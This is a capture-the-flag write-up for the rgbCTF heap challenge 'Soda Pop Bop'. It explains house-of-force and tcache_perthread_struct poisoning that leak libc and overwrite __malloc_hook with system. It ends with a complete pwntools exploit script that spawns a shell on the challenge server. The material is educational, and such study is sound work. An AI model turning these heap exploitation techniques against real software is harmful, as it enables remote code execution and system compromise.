# Soda Pop Bop

House of force + tcache_perthread_struct overwrite/tcache poisoning

Let's break down the main execution of the program. You input the party size, and it mallocs the party size << 5. Essentially, the party size * 32.

This is so that it can allocate enough party member structs, where the party member struct looks like this
```c
struct member{
  char name[24];
  long drink;
}
```
If we're "all alone"(party size less than 2) it reads a name into the malloc-ed chunk and initialises the drink to 0xffffffffffffffff

This is where the vulnerability lies.

If we give a party size of 0, malloc will return a 0x20 length chunk(that includes metadata). In essentiality, a party size of 0 will lead to

[0x18 data bytes allocated][top chunk]

This means that if we give a party size of 0, the top chunk's value will be set to 0xffffffffffffffff!

That allows us to carry out the house of force attack by requesting large chunks that nudge the top chunks into other places. But, before we get into that, let's look at the song choosing and singing.

We can sing a song. This causes it to print out the value inside of the chosen_song variable. This is useful for heap and binary base leaks.

The chosen_song variable at first contains a pointer to a string in the binary "Never Gonna Give You Up - Rick Astley", so singing the song gives us a binary base leak we can offset.

Now, we can choose a song. We get to give the song title size, then it malloc's that much, and calls fgets(malloc_ptr,size,stdin); It then sets chosen_song to this new pointer returned by malloc. So by singing a song again after choosing a song, we get a heap leak.

Ok, now what?

The house of force can let us allocate anywhere in memory, but we only know the whereabouts of the heap and binary. Full RELRO's on, so none of that is very useful. We need some way to get a libc leak.
That's where the tcache comes in.

Now, you might be confused as of how we can control the tcache without using a single free, but that is how the tcache_perthread_struct becomes useful.

The only useful printing we can do is singing a song. This means in order to leak a libc pointer, we must make malloc return a libc pointer without knowing the libc pointer beforehand.

How?

Let's take a look at the tcache_perthread_struct, which is stored at the very beginning of the heap.
```c
typedef struct tcache_perthread_struct

{

  char counts[TCACHE_MAX_BINS];

  tcache_entry *entries[TCACHE_MAX_BINS];

}
# define TCACHE_MAX_BINS                64
```
It contains the counts encoded in characters for all the 64 bins, as well as pointers to the start of the bins.

The wonderful thing about tcache is the lack of checks. Because all chunks in a bin are meant to be the same size, it won't check whether or not we are just pointing it to some random memory.

So, we can use the house of force(malloc-ing a chunk with a specific size that when added from the top chunk location it will cause integer overflow that makes malloc place the top chunk back at tcache_perthread_struct) to get the top chunk at the tcache perthread. At this point, the top chunk will have size 0x269. I found that allocating 0x230 was the highest I could get without malloc throwing a hissy fit.

So that's how we gain control of tcache perthread, which gives us full tcache control. What do we do with this?
```c
typedef struct tcache_entry

{

  struct tcache_entry *next;

}
```
What if we pointed a tcache bin at an address we know will contain a libc pointer, such that we can malloc once, get that libc pointer at the top of the tcache, then malloc again, returning the libc pointer?

The GOT.

Ok. Let's place a count of 2 inside of the 0x20 bin. Then we can point the bin at puts@got. Let's a choose a song of size 0. Fgets 0 will give no input.

This means the fact that the got isnt writeable will have no effect.

Then if we choose a song with size 0 again, the returned pointer will be puts@glibc, which we can then leak by singing a song.

Brilliant, a libc leak!

Now what?

At this point, the heap is fried. Any more allocations served from the top chunk will cause horrible consequences.

Let's go back to when we had full tcache_perthread_struct control. The 0x20 bin we've already dealt with, but let's abuse some other bins.

We can point the 0x30 bin and the 0x40 bin into a writeable segment inside of the binary.

Hmm, that's cool and all, but how do we arb write? We can't exactly house of force again.

... Or can we?

Well, we can, but I didn't. Instead, I pointed two bins to the exact same location. I gave the 0x30 bin count 1 and the 0x40 bin count 2, and pointed them to the same address

Tcache would be like so
```
0x20 bin -> puts@got -> puts
0x30 bin -> writeable area
0x40 bin -> writeable area -> 0x0
```
```
So, let's do our two 0 chunk allocations and leak libc.
0x30 bin -> writeable area
0x40 bin -> writeable area -> 0x0
```

Choose a song of size 0x20, will be served from the 0x30 bin.

0x40 bin -> writeable area -> 0x0

We now have full control over what the 0x40 bin will think is a tcache chunk. Let's write the malloc hook address to it.

0x40 bin -> writeable area -> malloc hook

Choose a song of size 0x30, will be served from 0x40 bin. Now malloc hook is at top of tcache! Choose a song of size 0x30 again, and we'll get an arbitrary write at malloc hook. Let's write system to malloc hook.

Ok, so now we want to call malloc on a /bin/sh pointer. How? We need to input size as a number.

Malloc will call malloc hook on the size.

What we can do is send a size number that is actually a disguised /bin/sh pointer. Malloc will then call system on this number, actually calling system("/bin/sh")

NOTE: The final step didn't work locally for me, but it works remotely.
Summarised plan:
1. House of force to get heap chunk pointing to tcache_perthread_struct
2. Put count of 2 inside of 0x20 bin. Set the top of the bin to point to puts@got for example
3. Put count of 1 inside 0x30 bin and 2 inside the 0x40 bin. Point them towards the same place, some writeable segment inside of the binary.
3. Choose a song with length 0. It'll allocate in the 0x20 bin but also fgets 0 will give us no input so no sigsev should occur
4. Top of tcache will have pointer to puts@GLIBC
5. Choose another song with length 0. Returned pointer should be puts@GLIBC. Again, fgets 0 gives no input, no sigsev
6. Sing song, that should print the libc pointer
7.  Create a 0x20 length song, will be allocated at the writeable segment. It will ALSO be at the top of the 0x40 tcache, allowing for poisoning. ( see step 3). Set next pointer to malloc hook
8. Create 0x30 length song. Create another. This will be at malloc hook, write system to it
9. Choose a song where the song title size represents the pointer to /bin/sh in libc

The below exploit script does everything up to and including overwriting malloc hook with system. It also prints the /bin/sh pointer as decimal to you, then opens an interactive prompt. From there, manually choose a song, input the number, and a shell will be popped.

We can cat `/pwn/flag.txt` to get the flag.

Script:
```python
#!/usr/bin/env python3

from pwn import *
PARTYSIZE = 0
e = ELF("spb")
libc = ELF("libc-2.27.so")
context.binary = e
def chooseSong(length, title=b'',dodata=True):
    p.sendlineafter('> ', str(1))
    p.sendlineafter('> ', str(length))
    if dodata:
        p.sendlineafter('> ', title)
def getDrink(member, drink):
    p.sendlineafter('> ', str(2))
    p.sendlineafter('> ', str(member))
    p.sendlineafter('> ', str(drink))

def singSong():
    p.sendlineafter('> ', str(3))
    p.recvuntil('0x')
    ptr = int(p.recvuntil(' '), 16)
    return ptr
def twoscomplement(num):
  if num >= 0:
    return num
  return (0xffffffffffffffff ^ abs(num)) + 1
def conn():
    if args.LOCAL:
        return process(["./ld-2.27.so",e.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("challenge.rgbsec.xyz",6969)
p = conn()
rickroll = 0xf08
heapoffset = 0x280
topchunk = 0x298
newsize = 0xffffffffffffffd9
p.sendlineafter('> ', str(PARTYSIZE))
p.recvuntil("> ")
p.sendline(str(PARTYSIZE))
p.recvuntil("> ")
p.sendline(b"t")
leak = singSong()
e.address = leak - rickroll
log.info(f"Binary base: {hex(e.address)}")
chooseSong(0x10,b'2nd')
heapleak = singSong()
log.info(f"Heap leak: {hex(heapleak)}")
heapbase = heapleak - heapoffset
log.info(f"Heap base: {hex(heapbase)}")
topchunk += heapbase
perthread = heapbase + 0x10
log.info(f"tcache_perthread_struct: {hex(perthread)}")
reqsize = perthread - topchunk - 16 - 8
reqsize = twoscomplement(reqsize)
log.info(f"Size to request: {hex(reqsize)}")
log.info(f"Size as decimal: {reqsize}")
chooseSong(reqsize,dodata=False)
# Top chunk at tcache_perthread_struct
# Ask for 0x230 size chunk, we get to mess up the tcache
fakestruct = b'\x02\x01\x02'.ljust(64,b'\x00')
fakestruct += p64(e.got['puts']) + p64(e.address + 0x000000000202000 + 0x100) + p64(e.address + 0x000000000202000 + 0x100)
chooseSong(0x230,fakestruct)
chooseSong(0,dodata=False)
chooseSong(0,dodata=False)
libcleak = singSong()
libcbase = libcleak - libc.symbols['puts']
log.info(f"Libc base: {hex(libcbase)}")
libc.address = libcbase
chooseSong(0x20,p64(libc.symbols['__malloc_hook'])) # Put inside of 0x40 tcache bin
chooseSong(0x30)
chooseSong(0x30,p64(libc.symbols['system']))
log.info("/bin/sh pointer as decimal: {}".format(next(libc.search(b"/bin/sh\x00"))))
binsh = next(libc.search(b"/bin/sh\x00"))
p.sendlineafter("> ","1")
p.sendlineafter("> ",str(binsh))
p.interactive()
```

#### rgbCTF{l3ts_g31_th1s_bre@d}
